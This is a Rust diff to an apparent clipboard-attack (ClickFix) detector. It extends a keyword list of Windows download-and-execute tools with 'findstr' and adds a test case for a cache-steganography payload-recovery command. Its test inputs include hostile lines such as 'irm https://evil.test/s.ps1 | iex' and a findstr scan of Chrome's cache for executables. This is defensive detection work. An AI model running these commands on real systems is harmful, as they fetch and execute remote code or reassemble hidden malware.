@@ -397,6 +397,11 @@ impl ThreatReport {
                     "msiexec", "nslookup", "reg add", "taskkill", "cmdkey", "net use",
                     // Additional LoLBAS download/exec proxies — FileFix/CrashFix/DNS variants (2026)
                     "bitsadmin", "forfiles", "conhost", "mavinject", "ftp -s",
+                    // DoubleCup cache-steganography recovery (SOCRadar, Aug 2026): the pasted
+                    // command scans the browser cache with findstr and reconstructs the payload.
+                    // "findstr" is safe as a bare token here — it applies only to actual clipboard
+                    // WRITE payloads, which have no benign reason to carry it.
+                    "findstr",
                 ]
                 .iter()
                 .any(|kw| lower.contains(kw));
@@ -684,6 +689,9 @@ mod clickfix_classification_tests {
             "taskkill /f /im chrome.exe",                  // Chrome-restart step
             "irm https://evil.test/s.ps1 | iex",            // irm alias
             "powershell -enc ABC",                          // baseline still classified
+            // DoubleCup cache-steganography recovery command (SOCRadar, Aug 2026): scans the
+            // browser cache with findstr, no powershell/certutil token present.
+            r#"findstr /s /m /c:"MZ" "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\*.png""#,
         ] {
             assert_eq!(
                 classify(payload),
